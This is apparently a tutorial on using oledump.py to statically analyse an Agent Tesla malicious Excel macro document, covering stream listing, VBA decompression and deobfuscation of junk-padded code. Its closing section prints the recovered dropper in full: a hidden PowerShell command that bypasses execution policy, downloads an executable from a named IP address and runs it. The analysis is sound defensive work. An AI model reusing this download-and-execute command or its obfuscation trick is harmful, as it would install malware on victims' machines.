# oledump.py Guide and Analysis Summary

## What is oledump.py?

`oledump.py` is a Python-based static analysis tool used to examine OLE2 files (Object Linking and Embedding). These files, also known as Structured Storage or Compound File Binary Format, are proprietary Microsoft formats used to store multiple data types (like macros) inside single documents, spreadsheets, and presentations. `oledump.py` is highly valuable for forensic analysis and malware detection because it allows analysts to extract and inspect embedded scripts safely.

---

## Oledump.py Command Guide

Here are the primary commands and parameters used to analyze an OLE2 file with `oledump.py`:

| Command / Parameter | Description |
| :--- | :--- |
| `oledump.py <filename>` | Scans the document and lists all available data streams. |
| `-s <number>` | Selects a specific data stream to view its contents (outputs in hex dump format by default). |
| `--vbadecompress` | Automatically decompresses hidden or compressed VBA macros into readable text. |

### The Analysis Workflow

When conducting static analysis on a potentially malicious document (like the `agenttesla.xlsm` file from the text), follow this workflow:

**1. Scan the File for Macros**
Run `oledump.py agenttesla.xlsm` to list all data streams. Look closely at the output for streams marked with a capital **M**. 
*   *Example output:* `A4: M 688 'VBA/ThisWorkbook'`
*   The **M** indicates the presence of a Macro. The number `4` in `A4` is the stream index you will need to target.

**2. Extract the Target Data Stream**
Use the `-s` parameter to look inside the macro stream. 
*   *Command:* `oledump.py agenttesla.xlsm -s 4`
*   This will display the contents of stream 4, but it will likely be in an unreadable hex dump format.

**3. Decompress the VBA Script**
To make the macro readable, add the decompression flag to your command.
*   *Command:* `oledump.py agenttesla.xlsm -s 4 --vbadecompress`
*   This outputs the actual VBA code written by the threat actor. 

**4. Deobfuscate the Payload**
Malware authors often obfuscate their code using junk characters to evade detection. In the Agent Tesla example, a variable (`Sqtnew`) contained a PowerShell command heavily padded with `*` and `^` characters, followed by VBA commands to replace those characters with nothing (`""`).
*   To read the true command, you can use a tool like CyberChef with the **Find/Replace** operation to strip out the junk characters (e.g., removing all `*` and `^`).

---

## Analysis Summary: Agent Tesla Behavior

After deobfuscating the macro found in the `agenttesla.xlsm` document, the script revealed a classic "dropper" technique. When the user opens the Excel file, the macro executes the following hidden PowerShell command:

```powershell
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile; Start-Process $TempFile;
```

**What this command does:**
1.  **`-WindowStyle hidden`**: Runs PowerShell invisibly so the victim notices nothing.
2.  **`-executionpolicy bypass`**: Ignores Windows' default security restrictions against running scripts.
3.  **`Invoke-WebRequest`**: Reaches out to a malicious IP address (`193.203.203.67`) to download a malicious executable file disguised as a PDF (`Doc-3737122pdf.exe`).
4.  **`Start-Process`**: Immediately executes the downloaded malware on the victim's machine.
